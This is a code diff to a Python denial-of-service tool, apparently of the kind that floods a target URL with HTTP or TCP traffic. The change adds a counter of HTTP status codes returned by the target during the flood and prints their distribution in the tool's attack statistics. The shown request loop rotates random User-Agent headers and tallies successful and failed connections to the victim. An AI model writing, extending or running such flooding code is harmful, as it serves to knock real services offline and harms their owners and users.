@@ -2,19 +2,20 @@ import os
 import sys
 import json
 import time
+import math
 import random
 import socket
 import string
 import signal
 import threading
 import subprocess
-import math
-from typing import List
 import urllib.request
-from os import urandom as randbytes
+from typing import List
 from base64 import b64decode
 from datetime import datetime
 from optparse import OptionParser
+from collections import defaultdict
+from os import urandom as randbytes
 from dataclasses import dataclass, field
 
 
@@ -89,6 +90,9 @@ class Context:
     show_statistics: bool = False
     current_ip = None
     getting_ip_in_progress: bool = False
+
+    # Method-related stats
+    http_codes_counter = defaultdict(int)
 
 
 def get_app_version():
@@ -203,9 +207,14 @@ def down_it_http(_ctx: Context):
         http_headers['User-Agent'] = random.choice(_ctx.user_agents).strip()
 
         try:
-            urllib.request.urlopen(
+            res = urllib.request.urlopen(
                 urllib.request.Request(_ctx.url, headers=http_headers))
-        except:
+            _ctx.http_codes_counter[res.status] += 1
+        except Exception as e:
+            try:
+                _ctx.http_codes_counter[e.status] += 1
+            except:
+                pass
             _ctx.connections_failed += 1
         else:
             _ctx.connections_success += 1
@@ -368,6 +377,16 @@ def show_info(_ctx: Context):
     sys.stdout.flush()
 
 
+def build_http_codes_distribution(http_codes_counter):
+    codes_distribution = []
+    total = sum(http_codes_counter.values())
+    for code in http_codes_counter.keys():
+        count = http_codes_counter[code]
+        percent = round(count * 100 / total)
+        codes_distribution.append(f'{code}: {count} ({percent}%)')
+    return ', '.join(codes_distribution)
+
+
 def show_statistics(_ctx: Context):
     """Prints statistics to console."""
     if not _ctx.show_statistics:
@@ -397,6 +416,8 @@ def show_statistics(_ctx: Context):
         # print(f'CPU Load Average:           {cpu_load}')
         if _ctx.attack_method == 'http':
             print(f'Requests sent:              {_ctx.packets_sent}')
+            if len(_ctx.http_codes_counter.keys()):
+                print(f'HTTP codes distribution:    {build_http_codes_distribution(_ctx.http_codes_counter)}')
         elif _ctx.attack_method == 'tcp':
             size_sent = convert_size(_ctx.packets_sent)
             if _ctx.packets_sent == 0:
